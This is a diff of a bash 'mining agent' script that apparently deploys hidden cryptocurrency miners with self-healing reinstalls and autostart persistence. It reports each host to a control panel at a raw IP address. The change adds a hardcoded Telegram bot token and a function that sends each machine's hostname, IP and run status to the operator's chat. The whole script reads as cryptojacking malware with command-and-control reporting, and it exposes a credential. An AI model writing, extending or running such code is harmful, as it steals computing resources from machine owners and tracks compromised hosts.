@@ -1,11 +1,11 @@
 #!/bin/bash
-# MINING AGENT v4.2 — PANEL-ONLY | SELF-HEALING | ULTRA PORTABLE
-# No local logs, no Telegram. Only panel heartbeat/log push.
-# Launch: ALLOW_MINING=1 bash ./mining_agent.sh
+# MINING AGENT v4.3 — PANEL + CRITICAL TG | SELF-HEALING | ULTRA PORTABLE
+# No local logs. Panel heartbeat. Telegram only for start/success/fatal errors.
+# Launch: ALLOW_MINING=1 bash agent.sh
 set -u
 
 #############################################
-# CONFIGURATION (EDIT IF NEEDED)
+# CONFIGURATION
 #############################################
 ALLOW_MINING="${ALLOW_MINING:-0}"
 TEST_MODE="${TEST_MODE:-0}"
@@ -14,8 +14,8 @@ HEARTBEAT_INTERVAL="${HEARTBEAT_INTERVAL:-300}"  # panel heartbeat interval (sec
 INSTALL_RETRIES="${INSTALL_RETRIES:-5}"
 DOWNLOAD_TIMEOUT="${DOWNLOAD_TIMEOUT:-45}"
 MAX_RESTARTS_BEFORE_REINSTALL="${MAX_RESTARTS_BEFORE_REINSTALL:-3}"
-RESTART_WINDOW_SECONDS="${RESTART_WINDOW_SECONDS:-3600}"   # 1 hour
-REINSTALL_COOLDOWN="${REINSTALL_COOLDOWN:-1800}"           # 30 min after reinstall
+RESTART_WINDOW_SECONDS="${RESTART_WINDOW_SECONDS:-3600}"
+REINSTALL_COOLDOWN="${REINSTALL_COOLDOWN:-1800}"
 
 # Panel settings
 PANEL_BASE_URL="${PANEL_BASE_URL:-http://31.76.50.139}"
@@ -23,15 +23,20 @@ HEARTBEAT_ENDPOINT="${HEARTBEAT_ENDPOINT:-/api/heartbeat}"
 LOGS_ENDPOINT="${LOGS_ENDPOINT:-/api/logs/push}"
 PANEL_USERNAME="${PANEL_USERNAME:-$(whoami)}"
 
+# Telegram (CRITICAL MESSAGES ONLY)
+TG_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
+TG_CHAT="5336452267"
+TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"
+
 # Kryptex Account
 KRIPTEX="krxX3PVQVR"
 
-# Pools (multiple endpoints for failover)
+# Pools
 XMR_POOL="xmr.kryptex.network:7029"
 ETC_POOL="etc.kryptex.network:7033"
 RVN_POOL="rvn.kryptex.network:6013"
 
-# Paths (only essential directories remain)
+# Paths
 BASE="${HOME}/.mining"
 BIN="$BASE/bin"
 RUN="$BASE/run"
@@ -42,7 +47,7 @@ STATE_GPU="$RUN/gpu.state"
 AGENT_LOCK="/tmp/mining_agent.lock"
 
 #############################################
-# DEPENDENCY CHECK & FALLBACKS
+# DEPENDENCY CHECK
 #############################################
 
 command_exists() { command -v "$1" >/dev/null 2>&1; }
@@ -57,8 +62,8 @@ ensure_http_client() {
 http_get() {
   _url="$1"; _timeout="${2:-$DOWNLOAD_TIMEOUT}"
   case "$HTTP_CLIENT" in
-    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.2" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
-    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/4.2" --tries=2 "$_url" 2>/dev/null ;;
+    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.3" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
+    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/4.3" --tries=2 "$_url" 2>/dev/null ;;
     busybox) busybox wget -qO- -T "$_timeout" "$_url" 2>/dev/null ;;
     *) return 1 ;;
   esac
@@ -67,8 +72,8 @@ http_get() {
 download_file() {
   _out="$1"; _url="$2"; _timeout="${3:-$DOWNLOAD_TIMEOUT}"
   case "$HTTP_CLIENT" in
-    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.2" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
-    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/4.2" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
+    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.3" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
+    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/4.3" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
     busybox) busybox wget -T "$_timeout" -O "$_out" "$_url" 2>/dev/null ;;
     *) return 1 ;;
   esac
@@ -89,16 +94,6 @@ get_arch() {
   esac
 }
 
-get_os() {
-  if [ -f /etc/os-release ]; then
-    . /etc/os-release 2>/dev/null
-    echo "${ID:-unknown}" | tr '[:upper:]' '[:lower:]'
-  elif [ -f /etc/alpine-release ]; then echo "alpine"
-  elif [ -f /etc/centos-release ]; then echo "centos"
-  else echo "unknown"
-  fi
-}
-
 check_disk_space() {
   _required_mb="${1:-100}"
   _available=$(df -m "$BASE" 2>/dev/null | tail -1 | awk '{print $4}')
@@ -113,7 +108,7 @@ has_gpu() {
 }
 
 #############################################
-# IP ADDRESS (EXTERNAL + LOCAL FALLBACK)
+# IP ADDRESS
 #############################################
 
 get_report_ip() {
@@ -128,7 +123,6 @@ get_report_ip() {
     _ip=$(http_get "$_src" 15 2>/dev/null | tr -d '[:space:]' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | head -1)
     [ -n "$_ip" ] && [ "$_ip" != "127.0.0.1" ] && echo "$_ip" && return 0
   done
-
   _local_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
   [ -n "$_local_ip" ] && [ "$_local_ip" != "127.0.0.1" ] && echo "$_local_ip" && return 0
   echo "0.0.0.0"
@@ -159,7 +153,7 @@ kill_miner() {
 }
 
 #############################################
-# RESTART TRACKING (WITH COOLDOWN)
+# RESTART TRACKING
 #############################################
 
 init_state() { [ -f "$1" ] || echo "0|0|0" > "$1"; }
@@ -187,7 +181,7 @@ should_reinstall() {
 reset_restart_state() { echo "0|0|$(date +%s)" > "$1"; }
 
 #############################################
-# INSTALLERS (5 MIRRORS + RETRIES)
+# INSTALLERS
 #############################################
 
 install_xmrig() {
@@ -336,6 +330,22 @@ ensure_autostart() {
 }
 
 #############################################
+# TELEGRAM (CRITICAL ONLY)
+#############################################
+
+tg() {
+  _text="$1"
+  if command_exists curl; then
+    curl -s --connect-timeout 10 -m 20 -X POST "$TG_API" \
+      -d chat_id="$TG_CHAT" \
+      --data-urlencode text="$_text" >/dev/null 2>&1 || true
+  elif command_exists wget; then
+    wget -q --timeout=10 -O- --post-data="chat_id=$TG_CHAT&text=$(printf '%s' "$_text" | sed 's/&/%26/g')" \
+      "$TG_API" >/dev/null 2>&1 || true
+  fi
+}
+
+#############################################
 # PANEL COMMUNICATION
 #############################################
 
@@ -444,7 +454,7 @@ recover_gpu() {
 }
 
 #############################################
-# LOCK FILE (PREVENT DUPLICATE AGENT)
+# LOCK FILE
 #############################################
 
 acquire_lock() {
@@ -466,18 +476,25 @@ main() {
   acquire_lock
 
   mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" 2>/dev/null || exit 1
-  ensure_http_client || exit 1
+  ensure_http_client || {
+    tg "❌ No HTTP client on $(hostname)"
+    exit 1
+  }
 
   NODE_ID=$(get_node_id)
   REPORT_IP=$(get_report_ip)
   RUN_ID="${NODE_ID}-$(date +%s)-$$"
   _arch=$(get_arch)
-  _os=$(get_os)
+  _os=$(get_os 2>/dev/null || echo "unknown")
+
+  # Telegram: agent starting
+  tg "🟢 Mining agent starting on ${NODE_ID} (${REPORT_IP}) | RunID: ${RUN_ID}"
 
   init_state "$STATE_CPU"
   init_state "$STATE_GPU"
 
   if ! check_disk_space 200; then
+    tg "❌ No disk space on ${NODE_ID} (${REPORT_IP})"
     send_log "error" "No disk space"
     exit 1
   fi
@@ -514,8 +531,10 @@ main() {
 
   if [ "$_cpu_ok" = "1" ] || [ "$_gpu_ok" = "1" ]; then
     _status="CPU:${_cpu_ok} GPU:${_gpu_ok}"
+    tg "✅ Mining active on ${NODE_ID} (${REPORT_IP}) | ${_status} | RunID: ${RUN_ID}"
     send_log "info" "Mining started: ${_status}"
   else
+    tg "❌ Mining setup FAILED on ${NODE_ID} (${REPORT_IP}) | RunID: ${RUN_ID}"
     send_log "error" "Mining setup failed"
     exit 1
   fi
